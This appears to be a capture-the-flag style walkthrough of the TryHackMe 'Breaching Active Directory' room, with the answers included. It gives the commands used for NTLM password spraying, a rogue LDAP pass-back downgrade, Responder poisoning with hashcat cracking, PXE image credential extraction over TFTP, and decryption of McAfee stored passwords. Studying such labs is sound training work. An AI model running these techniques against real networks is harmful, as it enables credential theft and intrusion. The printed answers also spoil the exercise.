![Breaching Active Directory Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/breachingad/Breaching_Active_Directory_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/breachingad/Breaching_Active_Directory_Cover.png" alt="Breaching Active Directory Logo">
</p>

# Breaching Active Directory

This guide contains the answer and steps necessary to get to them for the [Breaching Active Directory](https://tryhackme.com/r/room/breachingad) room.

## Table of contents

- [OSINT and Phishing](#osint-and-phishing)
- [NTLM Authenticated Services](#ntlm-authenticated-services)
- [LDAP Bind Credentials](#ldap-bind-credentials)
- [Authentication Relays](#authentication-relays)
- [Microsoft Deployment Toolkit](#microsoft-deployment-toolkit)
- [Configuration Files](#configuration-files)

### OSINT and Phishing

1. I understand OSINT and how it can be used to breach AD

2. I understand Phishing and how it can be used to breach AD

3. What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?

   This answer can be found in the text or by searching online.

   ><details><summary>Click for answer</summary>HaveIBeenPwned</details>

### NTLM Authenticated Services

1. What is the name of the challenge-response authentication mechanism that uses NTLM?

   This can be found in the text.

   ><details><summary>Click for answer</summary>NetNtlm</details>

2. What is the username of the third valid credential pair found by the password spraying script?

   We first download the pyton script and place it on our machine. Herein we can see we have four arguments we need to supply (-u, -f, -p, -a).

   ![NTLM Script.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_NTLM_Script.png)

   Using `Changeme123` as the password, we use the following command to start the spray attack:

   ```sh
   python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
   ```

   ![NTLM Credentials.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_NTLM_Credentials.png)

   We found four sets of credentials using this attack!

   ><details><summary>Click for answer</summary>gordon.stevens</details>

3. How many valid credentials pairs were found by the password spraying script?

   This is found from the results of the scan in the previous question.

   ><details><summary>Click for answer</summary>4</details>

4. What is the message displayed by the web application when authenticating with a valid credential pair?

   On `http://ntlmauth.za.tryhackme.com/` we get a login screen where we can use our previously found credentials.

   ![NTLM Login.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_NTLM_Login.png)

   Logging in on Firefox didn't work, so I had to switch to Chrome.

   ![NTLM Welcome.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_NTLM_Welcome.png)

   ><details><summary>Click for answer</summary>Hello World</details>

### LDAP Bind Credentials

1. What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>LDAP Pass-back Attack</details>

2. What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>LOGIN,PLAIN</details>

3. What is the password associated with the svcLDAP account?

   Since I didn't have OpenLPAD installed on my machine I had to do so manually with:

   ```cmd
   sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

   sudo dpkg-reconfigure -p low slapd
   ```

   On the config screen we start the server config process.

   ![LDAP Config 1.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Config_1.png)

   We use `za.tryhackme.com` as the domain and the company name.

   ![LDAP Config 2.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Config_2.png)

   Next, we create a file called `` with the following contents:

   ```ldif
   #olcSaslSecProps.ldif
   dn: cn=config
   replace: olcSaslSecProps
   olcSaslSecProps: noanonymous,minssf=0,passcred
   ```

   We then update the LDAP server with:

   ```cmd
   sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
   ```

   ![LDAP Config 3.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Config_3.png)

   Using `` we can see if the configuration has been completed successfully.

   ![LDAP Config 4.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Config_4.png)

   After testing the connection again on the printer page, we get the error message telling us we succeeded.

   ![LDAP Syntax.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Syntax.png)

   Now we can monitor the network traffic to intercept the password.

   Using Wireshark we use the `breachad` interface to collect the correct data. We can clear up the screen by only looking at the data coming from the printer.

   ```cmd
   ip.src == 10.200.24.201 and ldap
   ```

   After a few tries, we get the credentials in one of the calls in cleartext.

   ![LDAP Credentials.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_LDAP_Credentials.png)

   ><details><summary>Click for answer</summary>tryhackmeldappass1@</details>

### Authentication Relays

1. What is the name of the tool we can use to poison and capture authentication requests on the network?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Responder</details>

2. What is the username associated with the challenge that was captured?

   First, we setup Responder to listen for authentication requests.

   ```cmd
   sudo responder -I breachad
   ```

   ![Auth Responder.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Auth_Responder.png)

   After a while, we see it has intercepted a request. This request contains the name and password hash of the user.

   ![Auth Event.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Auth_Event.png)

   With this hash and the provided password list, we can attempt to crack the hash using hascat. Hashtype 5600 is for NTLMv2-SSP.

   ```cmd
   hashcat -a 0 -m 5600 ntlmhash passwordlist-1647876320267.txt --force
   ```

   ![Auth Cracked.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Auth_Cracked.png)

   ><details><summary>Click for answer</summary>svcFileCopy</details>

3. What is the value of the cracked password associated with the challenge that was captured?



   ><details><summary>Click for answer</summary>FPassword1!</details>

### Microsoft Deployment Toolkit

1. What Microsoft tool is used to create and host PXE Boot images in organisations?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary></details>

2. What network protocol is used for recovery of files from the MDT server?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary></details>

3. What is the username associated with the account that was stored in the PXE Boot image?

   I couldn't get the ssh connection to work on my kali instance, so I tried through the attackbox. After connecting, I created a new folder and added the powerpxe binary to it.

   ```cmd
   cd Documents
   mkdir Kevinovitz
   copy C:\powerpxe Kevinovitz\C:\powerpxe\LICENSE
   cd Kevinovitz
   ```

   ![Mdt Ssh.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Ssh.png)

   I then looked up the IP for the MDT server with `nslookup`:

   ```cmd
   nslookup thmmdt.za.tryhackme.com
   ```

   ![Mdt Ip.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Ip.png)

   Now we can transfer the bcd file using `tftp`, using the file name we found on the MDT server.

   ![Mdt Files.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Files.png)

   ```powershell
   tftp -i 10.200.24.202 GET "\tmp\x64uefi{D2CDF2F6-30D2-430D-84C0-32C200D1D39A}.bcd" conf.bcd
   ```

   ![Mdt Tftp.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Tftp.png)

   Here we get the path to the pxe boot file. We can download it with `tftp` using this path.

   ```powershell
   tftp -i 10.200.24.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
   ```

   ![Mdt Pxe.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Pxe.png)

   Now we can attempt to exfiltrate the credentials.

   ```powershell
   Get-FindCredentials -WimFile pxeboot.wim
   ```

   ![Mdt Credentials.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Mdt_Credentials.png)

   ><details><summary>Click for answer</summary>svcMDT</details>

4. What is the password associated with the account that was stored in the PXE Boot image?

   This password was found in the previous task using PowerPXE.

   ><details><summary>Click for answer</summary>PXEBootSecure1@</details>

5. While you should make sure to cleanup you user directory that you created at the start of the task, if you try you will notice that you get an access denied error. Don't worry, a script will help with the cleanup process but remember when you are doing assessments to always perform cleanup.

### Configuration Files

1. What type of files often contain stored credentials on hosts?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Configuration Files</details>

2. What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>ma.db</details>

3. What table in this database stores the credentials of the orchestrator?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>AGENT_REPOSITORIES</details>

4. What is the username of the AD account associated with the McAfee service?

   First we look up where the ma.db file is located. Namely: cd C:\ProgramData\McAfee\Agent\DB.

   ![Configuration File.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Configuration_File.png)

   We then transfer this file to our machine.

   ```cmd
   scp thm@thmjmp1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
   ```

   ![Configuration Transfer.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Configuration_Transfer.png)

   Opening this database in sqlitebrowser, we can open the table containing the credentials.

   ```cmd
   sqlitebrowser ma.db
   ```

   Here we navigate to the AGENT_REPOSITORIES table and find the credentials we are looking for.

   ![Configuration Credentials.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Configuration_Credentials.png)

   ><details><summary>Click for answer</summary>svcAV</details>

5. What is the password of the AD account associated with the McAfee service?

   Using the decryption script, we can decrypt the password we got from the database.

   ```cmd
   python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
   ```

   ![Configuration Password.png](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/breachingad/Breaching_Active_Directory_Configuration_Password.png)

   ><details><summary>Click for answer</summary>MyStrongPassword!</details>